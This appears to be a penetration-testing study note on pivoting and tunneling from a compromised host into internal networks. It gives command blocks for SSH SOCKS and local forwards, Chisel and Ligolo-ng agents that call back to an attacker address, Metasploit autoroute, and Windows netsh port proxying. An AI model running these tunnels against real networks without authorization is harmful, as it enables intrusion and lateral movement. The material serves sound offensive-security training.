# 15 — Pivoting & Tunneling

When you land on a dual-homed host (has a second NIC into an internal-only network you can't reach directly from your attack box).

## Step 1: Discover The Second Network

```bash
# Linux
ip a; route -n; cat /etc/hosts

# Windows
ipconfig /all; route print; arp -a
```

## SSH Dynamic Port Forward (SOCKS proxy) — simplest, if SSH creds available

```bash
ssh -D 1080 -N -f user@<pivot_host>
# Then use proxychains for any tool:
proxychains nmap -sT -Pn <internal_target>
proxychains crackmapexec smb <internal_target> -u user -p pass
```
Add to `/etc/proxychains.conf`: `socks5 127.0.0.1 1080`

## SSH Local Port Forward (single service access)

```bash
ssh -L 3389:<internal_target>:3389 user@<pivot_host>
# then RDP to localhost:3389
```

## Chisel (no SSH available, works over plain HTTP — great through restrictive firewalls)

```bash
# On attacker (server mode)
./chisel server -p 8000 --reverse

# On pivot host (client mode, connects back)
./chisel client YOUR_IP:8000 R:socks

# Then proxychains through it (client opens SOCKS on attacker at 1080 by default)
proxychains nmap -sT -Pn <internal_target>
```

## Ligolo-ng (modern, faster than Chisel, full tun interface instead of SOCKS — recommended default)

```bash
# On attacker: start proxy + create tun interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On pivot host: connect agent back
./agent -connect YOUR_IP:11601 -ignore-cert

# In proxy console:
session                      # select the agent
ifconfig                     # see its networks
sudo ip route add <internal_subnet>/24 dev ligolo
start                        # now internal subnet is directly routable, no proxychains needed!
```
**Better than HTB's Chisel-first teaching:** Ligolo-ng gives you a real routable interface (works with tools that don't support SOCKS, like raw nmap SYN scans) instead of forcing everything through `proxychains`, which breaks some tools and is slower. Use Ligolo-ng as default; keep Chisel as backup when ligolo's TUN setup isn't possible (no root, restrictive host).

## Metasploit Pivoting (if you're already in an msf session)

```
meterpreter > run autoroute -s <internal_subnet>/24
# background session, then:
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
# proxychains works through this too
```

## Double Pivot (pivot through a pivot)

Chain the same technique twice — e.g. ligolo agent on host A routes to network B, then another ligolo agent on a host in network B routes to network C. Add both routes on the attacker side.

## Port Forwarding On Windows (native, no tools needed)

```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<internal_target>
```

## Quick Reference — Tools In This File

| Task | HTB-taught | Faster/better alternative |
|---|---|---|
| General pivoting | Chisel + proxychains | `Ligolo-ng` — real interface, no proxychains hassle, faster |
| SOCKS via SSH | correct as-is | fine when SSH creds exist — cheapest option, no extra binaries |
| In-Metasploit pivot | autoroute + socks_proxy | correct as-is, use when already in a meterpreter session |

Next: `16-metasploit-notes.md`
